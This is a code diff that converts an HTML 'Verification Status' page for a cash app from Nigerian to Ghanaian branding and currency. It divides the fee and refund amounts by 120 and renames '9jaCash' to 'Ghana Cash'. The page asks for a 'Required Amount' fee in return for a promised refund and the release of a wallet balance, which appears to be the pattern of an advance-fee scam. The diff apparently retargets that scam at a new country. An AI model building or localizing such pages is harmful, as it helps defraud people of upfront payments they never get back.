@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Verification Status - 9jaCash</title>
+<title>Verification Status - Ghana Cash</title>
 
 <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore-compat.js"></script>
@@ -135,11 +134,11 @@ body{font-family:'Plus Jakarta Sans',sans-serif;background:#0f172a;color:#f8fafc
   </div>
   <div class="status-row">
     <div class="status-label">Required Amount</div>
-    <div class="status-value accent" id="feeDisplay">₦35,200</div>
+    <div class="status-value accent" id="feeDisplay">GH₵293.33</div>
   </div>
   <div class="status-row">
     <div class="status-label">Expected Refund</div>
-    <div class="status-value" id="refundDisplay">₦35,000</div>
+    <div class="status-value" id="refundDisplay">GH₵291.67</div>
   </div>
   <div class="status-row">
     <div class="status-label">Linked Account</div>
@@ -160,7 +159,7 @@ body{font-family:'Plus Jakarta Sans',sans-serif;background:#0f172a;color:#f8fafc
     <div class="timeline-dot" id="dot2"><i class="fa-solid fa-rotate-left"></i></div>
     <div class="timeline-content">
       <div class="timeline-title" id="step2Title">Refund Processing</div>
-      <div class="timeline-desc" id="step2Desc">₦35,000 + wallet balance released to your account</div>
+      <div class="timeline-desc" id="step2Desc">GH₵291.67 + wallet balance released to your account</div>
     </div>
   </div>
   <div class="timeline-item">
@@ -196,7 +195,7 @@ body{font-family:'Plus Jakarta Sans',sans-serif;background:#0f172a;color:#f8fafc
   <span>Contact Customer Care</span>
 </a>
 
-<div class="footer anim d5">9jaCash 2026 • Secure Verification System</div>
+<div class="footer anim d5">Ghana Cash 2026 • Secure Verification System</div>
 
 </div>
 
@@ -210,10 +209,10 @@ body{font-family:'Plus Jakarta Sans',sans-serif;background:#0f172a;color:#f8fafc
   
   // ========== FORMAT MONEY ==========
   function formatMoney(num) {
-    if (!num && num !== 0) return "₦0";
+    if (!num && num !== 0) return "GH₵0";
     let n = parseFloat(num);
-    if (isNaN(n)) return "₦0";
-    return "₦" + n.toLocaleString("en-NG");
+    if (isNaN(n)) return "GH₵0";
+    return "GH₵" + n.toLocaleString("en-GH", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
   }
   
   // ========== LOAD CUSTOMER CARE FROM ADMIN ==========
@@ -244,13 +243,15 @@ body{font-family:'Plus Jakarta Sans',sans-serif;background:#0f172a;color:#f8fafc
   }
   
   // ========== LOAD DATA ==========
+  // feeAmount / verificationRefund come from the saved verification record (shown as received).
+  // The fallbacks are the default amounts divided by 120.
   function loadData() {
     const stored = localStorage.getItem("9jaCashVerificationPending");
     if (stored) {
       try {
         const data = JSON.parse(stored);
-        document.getElementById("feeDisplay").textContent = formatMoney(data.feeAmount || 35200);
-        document.getElementById("refundDisplay").textContent = formatMoney(data.verificationRefund || 35000);
+        document.getElementById("feeDisplay").textContent = formatMoney(data.feeAmount || 293.33);
+        document.getElementById("refundDisplay").textContent = formatMoney(data.verificationRefund || 291.67);
         const mask = data.accountNumber ? "**** " + data.accountNumber.slice(-4) : "**** ****";
         document.getElementById("bankDisplay").textContent = mask;
       } catch (e) {}
